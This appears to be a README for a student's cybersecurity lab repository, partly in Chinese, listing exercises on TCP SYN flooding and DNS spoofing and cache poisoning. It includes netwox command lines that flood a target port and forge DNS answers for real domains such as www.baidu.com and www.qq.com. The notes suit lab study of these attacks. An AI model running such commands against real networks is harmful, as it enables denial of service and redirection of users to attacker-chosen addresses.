# Cyber-security-practice
ALL cyber-security-practice, include exploit loophole , web attack ,cryptographic, system explotation, developing tools and so on
## TCP协议漏洞利用
- `sysctl -w net.ipv4.tcp_syncookies=0/1`
- netwox `sudo netwox 76 -i IP -p PORT`
- scapy `python syn_flood.py`
- `syn_flood.c`  \
比较syn-cookies启用和不启用的情况下，攻击的效果（攻击前后，用telnet或者nc连接目标主机端口进行测试）
## DNS攻击
- 环境配置 
> - 修改`resolv.conf`
> - 启动bind9服务，`dig www.baidu.com`
> - 添加区域条目
- Netwox用户响应欺骗攻击
> - `sudo netwox 105 -h "www.baidu.com" -H "1.2.3.4" -a "ns.baidu.com" -A "1.2.3.5" `
- Netwox缓存中毒攻击
> - `sudo netwox 105 -h "www.qq.com" -H "1.2.3.4" -a "ns.cse04xr.com" -A "1.2.3.5" -f "src host IP" -d docker0 -T 600 `
- 远程DNS缓存中毒攻击
> - dns上使得`ns.xr.net`指向攻击机 `172.17.0.1`
> - 在user 中dig www.example.com
> - `udp.c`
> - 观察dns缓存

